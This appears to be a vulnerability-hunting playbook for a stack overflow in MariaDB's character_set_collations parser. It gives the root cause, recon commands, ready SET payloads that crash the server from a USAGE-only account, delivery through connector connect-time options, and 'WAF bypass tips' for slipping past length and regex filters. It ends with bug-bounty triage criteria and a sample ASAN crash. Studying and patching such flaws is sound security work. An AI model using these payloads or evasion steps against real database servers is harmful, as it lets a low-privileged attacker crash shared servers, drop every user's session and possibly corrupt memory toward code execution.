---
name: mariadb-charset-collation-map-bof
description: Hunt stack overflows where the copy bound is attacker input length, not destination size — DB sys-var text parsers, LEX_CSTRING tokenizers.
---

# Stack Overflow in Charset_Collation_Map insert_or_replace()

## 1 Trigger Conditions
- DB engine exposing a `character_set_collations` sys-var (MariaDB ≥ 11.2.1), or any text sys-var parsed by a custom tokenizer.
- Authenticated session; `USAGE` alone suffices — no SUPER.
- One `SET @@session.<var>='<overlong id>=x'` (charset side) or `'utf8mb3=<overlong id>'` (collation side).
- Stock build: the whole server dies — all sessions dropped, transactions rolled back. Without `-fstack-protector`, corruption may reach control flow → possible RCE.

## 2 Root Cause Pattern
`strmake(dst, src, len)` gets the *source* length (`LEX_CSTRING.length` from an unbounded token scan) instead of `sizeof(dst)`, writing into fixed stack arrays `char charset_name_c[MY_CS_CHARACTER_SET_NAME_SIZE + 1]` (33) and `char collation_name_c[MY_CS_COLLATION_NAME_SIZE + 1]` (65).
Flow: `SET` → `Sys_var_*::do_check()` → `*_map_from_item()` → `from_text()` → `insert_or_replace()` → `strmake()`.
Generic shape: bound checked against input length, never destination capacity, while the ident scanner walks `[A-Za-z0-9_]` unbounded.

## 3 Recon Checklist
- `SELECT VERSION();` and `SHOW VARIABLES LIKE 'character_set_collations';` — present means the parser is compiled in.
- `grep -rn "MY_CS_CHARACTER_SET_NAME_SIZE\|MY_CS_COLLATION_NAME_SIZE" sql/`, then audit every `strmake`/`memcpy`/`strncpy` fed by a `.length`; also grep `strmake(.*\.length)` in engine and client trees.
- List callers of `get_ident()` and every sys-var `check`/`update` callback parsing free text.

## 4 Hunt Methodology
- Map sys-var callbacks that hand tokenizer output to fixed buffers; compare each destination size with the bound actually passed.
- Build ASAN (`-fsanitize=address`); drive with SQL, then repeat via client paths (`libmariadb`, CLI, connector connect-time session vars).
- Test both operands, multiple comma-separated pairs, and the binary/prepared-statement protocol; read the upstream fix (bound replaced with `sizeof(dst)`) to hunt sibling sites it missed.

## 5 Payload Patterns
- `SET @@session.character_set_collations='AAAA…A(200)=x';`
- `SET @@session.character_set_collations='utf8mb3=AAAA…A(200)';`
- 34+ chars smashes the 33-byte buffer; 66+ the 65-byte one; 200 is unambiguous.
- Tokenizer keeps only `[A-Za-z0-9_]` — identifiers must be alnum/underscore.
- Deliver via `MYSQL_INIT_COMMAND`, JDBC `sessionVariables=`, or DSN options — no interactive SQL needed.

## 6 WAF Bypass Tips
- No HTTP WAF sees the DB wire protocol; this is an ordinary authenticated statement.
- The alnum-only value defeats quote/keyword filters, so evade *length heuristics*: use 34–40 chars, not 200; add extra pairs; vary case/whitespace (`@@SESSION`, `CHARACTER_SET_COLLATIONS`).
- If an app layer blocks `SET`, use the connector's connect-time variable option; `SET/**/@@session.<var>=…` and tab/newline padding break naive regex filters.

## 7 Triage Guidance
- DoS only, stock build: CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` = 6.5 → Medium, not Critical.
- High/Critical only with a proven control-flow hijack on a build lacking stack protectors; ASAN output alone is not RCE.
- Kill if SUPER is required, only the attacker's own connection drops, or the feature/version is absent.
- Demand: version + compiler flags, the ASAN trace at `strmake`/`insert_or_replace`, error log, and proof other clients dropped.
- DB-engine memory corruption pays without RCE — server-side DoS is the impact.

## 8 Example
```
-- user 'low' with only GRANT USAGE
SET @@session.character_set_collations='AAAA…A(200)=x';
-- ERROR 2013 (HY000): Lost connection to server during query
-- other sessions: same 2013; server restarts
==ERROR: AddressSanitizer: stack-buffer-overflow … WRITE of size 1
  #0 strmake strings/strmake.c:36
  #1 Charset_collation_map_st::insert_or_replace sql/charset_collations.cc:58
```
Repeat with `'utf8mb3=AAAA…A(200)'` to hit the 65-byte collation buffer.
